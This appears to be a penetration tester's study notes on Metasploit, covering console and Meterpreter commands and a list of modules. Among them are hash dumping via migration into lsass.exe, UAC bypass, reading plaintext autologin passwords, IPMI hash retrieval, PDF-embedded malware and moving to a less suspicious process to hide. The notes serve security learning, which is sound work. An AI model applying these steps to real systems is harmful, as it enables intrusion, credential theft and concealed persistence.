---
title: metasploit
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting  
---

# metasploit

## Run metasploit

```bash
# start the postgresql service
service postgresql start 

# Initiate database
sudo msfdb init 

# Launch metasploit from terminal. -q means without banner
msfconsole -q  
```

## Update metasploit 

How to update metasploit database, since msfupdate is deprecated.

```bash
# Update the whole system
apt update && apt-upgrade -y   

# Update libraries and dependencies
apt dist-upgrade

# Reinstall the app
apt install metasploit-framework 
```

## Basic commands

```msf
# Help information
show -h  
```

```
=========================

Database Backend Commands

=========================

db_connect        Connect to an existing data service

db_disconnect     Disconnect from the current data service

db_export         Export a file containing the contents of the database

db_import         Import a scan result file (filetype will be auto-detected)

db_nmap           Executes nmap and records the output automatically

db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)

db_remove         Remove the saved data service entry

db_save           Save the current data service connection as the default to reconnect on startup

db_status         Show the current data service status

hosts             List all hosts in the database

loot              List all loot in the database

notes             List all notes in the database

services          List all services in the database

vulns             List all vulnerabilities in the database

workspace         Switch between database workspaces
```
  

Cheat sheet: 

```msf
# Search modules
search (mysearchitem> 

# Search for exploit of service hfs 2.3 serve
searchsploit hfs 2.3

# Use a module 
use <name of module (like exploit/cmd/linux/tcp_reverse) or number> 

# Show options of current module (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> show options   

# Configure an option (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> set <option> <value> 

# Configure an option as a constant during the msf session (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> setg <option> <value> 

# Go back to the main msf prompt (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> back 

# View related information of the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> info 

# View related payloads of the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> show payloads 

# Set a payload for the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> set payload <value> 

# Before we run an exploit-script, we can run a check to ensure the server is vulnerable (Note that not every exploit in the Metasploit Framework supports the `check` function)
msf6 exploit(windows/smb/ms17_010_psexec) > check
 
# Run the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> run  

# Run the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> exploit 

# See all sessions (Watch out, prompt is included)
msf> sessions

# Switch to session number n (Watch out, prompt is included)
msf> sessions -i <n>  

# Kill all sessions (Watch out, prompt is included)
msf> sessions -K  
```
   

## Meterpreter

Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target. 

When having an active session on the victim machine, the best module to run a Meterpreter is s4u_persistence:

```msf
use exploit/windows/local/s4u_persistence

show options

sessions 
```




## meterpreter commands

```
# view all available commands
help 
  
# Obtain a shell. Exit to exit the shell
shell  

# View information about the system
sysinfo

# View the id that meterpreter assigns to the machine
machine_id

# Print the network configuration
ifconfig 

# check routing information
route   

# Download a file
download /path/to/fileofinterest.txt /path/to/ourmachine/destinationfile.txt

# Upload a file
upload /path/from/source.txt /path/to//destinationfile.txt

# Bypass the authentification. It takes you from normal user to admin
getsystem
# If the operation fails because of priv_elevated_getsystem error message, then use the  bypassuac module: use exploit/windows/local/bypassuac

# View who you are
getuid  

# View all running processes
ps

# View the process that we are
getpid

# Enumerate the modules available at this meterpreter session
use -l   

# load a specific module
use <name of module>  

# View all processes run by the system. This allows us to choose one in order to migrate the process of our persistent connection in order to have one less suspicious. 
ps -U SYSTEM  

# Change to a process
migrate  <pid>        
migrate -N lsass.exe
# -N   Look for the lsass.exe process and migrate the process into that. We can do this to run the command: hashdump (we’ll get hashes to use them with john the ripper or ophcrack). Also, we can choose a less suspicious process such as svhost.exe and migrate there.

# Get a windows shell
execute -f cmd.exe -i -H
```
  
## metasploit modules



### post/windows/gather/hasdump 

Once you have a meterpreter session as system user, this module dumps all passwords.

### windows/gather/arp-scanner

To enumerate IPs in a network interface


### windows/gather/credentials/windows_autologin

This module extracts the plain-text Windows user login password in  Registry. It exploits a Windows feature that Windows (2000 to 2008 R2) allows a user or third-party Windows Utility tools to configure User AutoLogin via plain-text password insertion in (Alt)DefaultPassword field in the registry location -  HKLM\Software\Microsoft\Windows NT\WinLogon. This is readable by all  users.

### post/windows/gather/win_privs

This module tells you the privileges you have on the exploited machine. 


### exploit/windows/local/bypassuac

If getsystem command fails (in the meterpreter) because of a priv_elevated_getsystem error message, then use this module to bypass that restriction. You will get a new meterpreter session with the UAC policy disabled. Now you can run getsystem.use

### post/multi/manage/shell_to_meterpretersessions

It upgrades your shell to a meterpreter

### auxiliary/server/socks_proxy

This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.


### exploit/windows/fileformat/adobe_pdf_embedded_exe

And also exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs To include malware into an adobe pdf

### Integration of metasploit with veil

One nice thing about veil is that it provides a metasploit RC file, meaning that in order to launch the multihandler you just need to run:

```bash
msfconsole -r path/to/metasploitRCfile
```


### IPMI Information discovery

[See ipmi service on UDP/623](623-intelligent-platform-management-interface-ipmi.md). This module discovers host information through IPMI Channel Auth probes:

```msfc
use auxiliary/scanner/ipmi/ipmi_version

show actions ...actions... msf 
set ACTION < action-name > msf 
show options 
# and set needed options
run
```

### PMI 2.0 RAKP Remote SHA1 Password Hash Retrieval

This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. 

```msf
use auxiliary/scanner/ipmi/ipmi_dumphashes

show actions

set ACTION < action-name >

show options
# set <options>

run
```
